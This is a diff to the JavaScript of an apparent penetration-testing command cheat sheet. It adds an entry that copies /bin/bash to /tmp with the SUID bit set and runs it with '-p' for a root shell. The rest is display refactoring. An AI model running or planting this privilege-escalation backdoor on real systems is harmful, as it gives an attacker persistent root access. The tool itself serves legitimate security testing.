@@ -198,6 +198,20 @@ const commands = [
         tags: ["linux","find", "Privilege Escalation", "Filesystem Enumeration", "Permissions"],
         default_wordlist: undefined
     },
+    // Filesystem operations
+    {
+    id: "copy_bash_to_tmp",
+    description: "Copy Bash to /tmp with with root permissions",
+    command: [
+        "cp /bin/bash /tmp/bash; chmod 4755 /tmp/bash",
+        "# to get root shell use -p flag",
+        "/tmp/bash -p",
+        ],
+    tool: "cp/chmod",
+    category: "Filesystem Operations",
+    tags: ["linux", "copy", "permissions","Privilege Escalation"],
+    default_wordlist: undefined
+},
 ];
 // 
 
@@ -373,6 +387,15 @@ function formatCategoryToId(category) {
     return `pills-${category.replace(/\s+/g, "-").toLowerCase()}`;
 }
 
+// Commands can be defined as a string or as one line per array item.
+function commandToString(command) {
+    if (Array.isArray(command)) {
+        return command.join("\n");
+    }
+
+    return command ?? "";
+}
+
 // Create a tab button
 function createTabButton(tabId, category, isActive) {
     // Define icons for different categories
@@ -407,7 +430,7 @@ function createTabButton(tabId, category, isActive) {
 function createTabContent(tabId, category, isActive) {
     const commandsForCategory = commands.filter(command => command.category.includes(category));
     const commandList = commandsForCategory.map(command => `
-        <li class="list-group-item bg-dark text-light">${command.command}</li>
+        <li class="list-group-item bg-dark text-light"><pre class="command-text mb-0">${commandToString(command.command)}</pre></li>
     `).join("");
 
     return `
@@ -445,7 +468,7 @@ function updateCommands() {
                             ${tagElements}
                         </div>
                         <div class="d-flex justify-content-between align-items-center">
-                            <pre class="command-text flex-grow-1">${replacedCommand}</pre>
+                            <pre class="command-text flex-grow-1 mb-0">${replacedCommand}</pre>
                             <button class="btn btn-secondary btn-sm copy-btn ms-3" data-command="${btoa(replacedCommand)}">
                                 <i class="fas fa-copy me-1"></i>Copy
                             </button>
@@ -480,7 +503,7 @@ function getInputValues() {
 function replacePlaceholders(command, values) {
     return Object.entries(values).reduce((cmd, [key, value]) => 
         cmd.replace(new RegExp(`{{${key}}}`, "g"), value || ""),
-    command);
+    commandToString(command));
 }
 
 // Set up input change listener to update commands dynamically and save to localStorage
